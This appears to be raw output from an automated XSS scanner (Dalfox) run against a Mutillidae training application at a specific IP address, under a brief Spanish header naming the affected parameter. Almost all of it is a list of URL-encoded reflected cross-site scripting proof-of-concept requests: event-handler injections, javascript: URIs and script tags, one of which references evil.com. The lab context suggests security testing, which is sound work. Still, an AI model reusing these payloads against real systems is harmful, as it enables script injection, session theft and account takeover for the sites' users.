🔗 URL: http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php
🧩 Parámetro afectado: page
📄 Evidencia:
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?hints-page-wrapper.php%3Flevel1HintIncludeFile%3D55=%22%3E%3CIMG+SRC%3Dx+oncontextmenu%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dset-background-color.php=%22%3E%3CIMG+SRC%3Dx+onended%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?cmd=%253E%253C%2564%2565%2574%2561%2569%256C%2573%2520%256F%2570%2565%256E%2520%256F%256E%2574%256F%2567%2567%256C%2565%253D%2561%256C%2565%2572%2574%2528%2531%2529%253E%253C%252F%2564%2565%2574%2561%2569%256C%2573%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?month=%2522%253E%253C%2573%2576%2567%2520%256F%256E%256C%256F%2561%2564%253D%2522%2566%2572%2561%256D%2565%2573%255B%2530%255D%252E%2561%256C%2565%2572%2574%2528%2531%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?item=%22%3E%3CIMG+SRC%3Dx+onplay%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.paypal.com%2Fcgi-bin%2Fwebscr=%26%2339%3B%26gt%3B%26lt%3Bembed+src%3D%23+codebase%3Djavascript%3Aalert%281%29%2F%2F+class%3Ddalfox%26gt%3B%26lt%3B%2Fembed%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?host=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%256C%256F%2561%2564%2573%2574%2561%2572%2574%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&rurl=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2574%2569%256D%2565%2575%2570%2564%2561%2574%2565%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?key=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2564%2575%2572%2561%2574%2569%256F%256E%2563%2568%2561%256E%2567%2565%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dprivilege-escalation.php=%2527%253E%253C%2573%2576%2567%253E%253C%2566%256F%2572%2565%2569%2567%256E%254F%2562%256A%2565%2563%2574%253E%253C%2569%256D%2567%2520%2573%2572%2563%253D%2578%2520%256F%256E%2565%2572%2572%256F%2572%253D%2561%256C%2565%2572%2574%2528%2531%2529%253E%253C%252F%2566%256F%2572%2565%2569%2567%256E%254F%2562%256A%2565%2563%2574%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dcapture-data.php=%26%2334%3B%26gt%3B%26lt%3BIMG+SRC%3Dx+ondragend%3D%26%2334%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%26%2334%3B+class%3Ddalfox%26gt%3B&page=show-log.php[0m
[95m[POC][R][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3Cslot+onslotchange%3Dconsole.warn%281%29+class%3Ddalfox%3E%3C%2Fslot%3E[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?name=%26gt%3B%26lt%3Blink+rel%3Dprefetch+href%3D%2F%2Fevil.com+onload%3Dalert%281%29+class%3Ddalfox%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dframer.html=%253E%253C%2566%256F%2572%256D%253E%253C%2562%2575%2574%2574%256F%256E%2520%2566%256F%2572%256D%2561%2563%2574%2569%256F%256E%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529%253E%2574%2565%2573%2574%253C%252F%2562%2575%2574%2574%256F%256E%253E%253C%252F%2566%256F%2572%256D%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&return=%26%2334%3B%26gt%3B%26lt%3Bsvg+onload%3D%26%2334%3Bnavigator.serviceWorker%26amp%3B%26amp%3Balert%281%29%26%2334%3B+class%3Ddalfox%26gt%3B[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2013-A8-Cross-Site_Request_Forgery_%2528CSRF%2529=%253E%253C%2573%2576%2567%253E%253C%2575%2573%2565%2520%2568%2572%2565%2566%253D%2564%2561%2574%2561%253A%2569%256D%2561%2567%2565%252F%2573%2576%2567%252B%2578%256D%256C%252C%253C%2573%2576%2567%2520%2569%2564%253D%2527%2578%2527%2520%2578%256D%256C%256E%2573%253D%2527%2568%2574%2574%2570%253A%252F%252F%2577%2577%2577%252E%2577%2533%252E%256F%2572%2567%252F%2532%2530%2530%2530%252F%2573%2576%2567%2527%2520%256F%256E%256C%256F%2561%2564%253D%2527%2561%256C%2565%2572%2574%2528%2531%2529%2527%253E%253C%252F%2573%2576%2567%253E%2523%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?image_url=%2527%253E%253C%2573%2576%2567%252F%256F%256E%256C%256F%2561%2564%253D%2561%256C%2565%2572%2574%2528%2531%2529%252F%252F%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?http%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2010-A7=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2563%256F%256E%2574%2565%2578%2574%256D%2565%256E%2575%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2013-A10-Unvalidated_Redirects_and_Forwards=%253E%253C%256D%2561%2572%2571%2575%2565%2565%2520%256F%256E%2573%2574%2561%2572%2574%253D%2561%256C%2565%2572%2574%2528%2531%2529%253E%253C%252F%256D%2561%2572%2571%2575%2565%2565%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?l=%2527%253E%253C%256D%2561%2572%2571%2575%2565%2565%2520%256F%256E%2573%2574%2561%2572%2574%253D%2561%256C%2565%2572%2574%2528%2531%2529%253E%253C%252F%256D%2561%2572%2571%2575%2565%2565%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?framer.html=%26%2334%3B%26gt%3B%26lt%3BIMG+SRC%3Dx+onplaying%3D%26%2334%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%26%2334%3B+class%3Ddalfox%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?.%2Fwebservices%2Fsoap%2Fws-hello-world.php=%2522%253E%253C%2573%2576%2567%2520%256F%256E%256C%256F%2561%2564%253D%2522%2566%2572%2561%256D%2565%2573%255B%2530%255D%252E%2561%256C%2565%2572%2574%2528%2531%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Darbitrary-file-inclusion.php=%22%3E%3Cimg+src%3Dx+onerror%3D%22requestAnimationFrame%28%28%29%3D%3Ealert%281%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?%3Fpage%3Dadd-to-your-blog.php=%22%3E%3CIMG+SRC%3Dx+onpaste%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
[95m[POC][R][GET][inHTML-URL] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php%27%3E%3Cinput+onfocus%3Dalert%281%29+autofocus%3E[0m
[95m[POC][R][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3Ctemplate+onload%3Dprompt%281%29+class%3Ddalfox%3E%3C%2Ftemplate%3E[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dclient-side-comments.php=%26%2334%3B%26gt%3B%26lt%3BIMG+SRC%3Dx+oncontextmenu%3D%26%2334%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%26%2334%3B+class%3Ddalfox%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2013-A9-Using_Components_with_Known_Vulnerabilities=%253E%253C%2574%2565%2578%2574%2561%2572%2565%2561%2520%256F%256E%2566%256F%2563%2575%2573%253D%2561%256C%2565%2572%2574%2528%2531%2529%2520%2561%2575%2574%256F%2566%256F%2563%2575%2573%253E%253C%252F%2574%2565%2578%2574%2561%2572%2565%2561%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?api=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%256C%256F%2561%2564%2565%2564%256D%2565%2574%2561%2564%2561%2574%2561%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?email=%253E%253C%256D%2565%2574%2561%2520%2568%2574%2574%2570%252D%2565%2571%2575%2569%2576%253D%2572%2565%2566%2572%2565%2573%2568%2520%2563%256F%256E%2574%2565%256E%2574%253D%2530%253B%2575%2572%256C%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?domain=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%256C%256F%2561%2564%2565%2564%256D%2565%2574%2561%2564%2561%2574%2561%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?data=%22%3E%3Csvg+onload%3D%22top.alert%281%29%22+class%3Ddalfox%3E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?data=%2522%253E%253C%2573%2576%2567%2520%256F%256E%256C%256F%2561%2564%253D%2522%256E%2561%2576%2569%2567%2561%2574%256F%2572%252E%2573%2565%2572%2576%2569%2563%2565%2557%256F%2572%256B%2565%2572%2526%2526%2561%256C%2565%2572%2574%2528%2531%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][R][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3CScRipt%3Econsole.error%281%29%3C%2Fscript%3E[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&token=%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22+class%3Ddalfox%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez[0m
[95m[POC][R][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3Ccanvas+onwebglcontextlost%3Dprint%281%29+class%3Ddalfox%3E%3C%2Fcanvas%3E[0m
[95m[POC][R][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3Cdiv+onpointerrawupdate%3Dprompt%281%29+class%3Ddalfox%3E%3C%2Fdiv%3E[0m
[95m[POC][R][GET][inHTML-URL] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php%27%3E%3Cdetails+open+ontoggle%3Dalert%281%29%3E%3C%2Fdetails%3E[0m
[95m[POC][R][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3Ccanvas+onwebglcontextlost%3Dconfirm.call%28%29%281%29+class%3Ddalfox%3E%3C%2Fcanvas%3E[0m
[95m[POC][V][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dconsole.log%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&username=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2577%2568%2565%2565%256C%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E[0m
[95m[POC][R][GET][inHTML-URL] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php%3E%3Cobject+data%3Djavascript%3Aalert%281%29+class%3Ddalfox%3E%3C%2Fobject%3E[0m
[95m[POC][R][GET][inHTML-URL] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php%22%3E%3Cscript%2F%22%3Ca%22%2Fsrc%3Ddata%3A%3D%22.%3Ca%2C%5B%5D.some%28confirm%29%3E[0m
[95m[POC][R][GET][inHTML-URL] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php%27%3E%3Ciframe+src%3Djavascript%3Aalert%281%29%3E%3C%2Fiframe%3E[0m
[95m[POC][V][GET][inHTML-URL] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php%22%3E%3CIMG+SRC%3Dx+onsearch%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E[0m
--------------------------------------------------
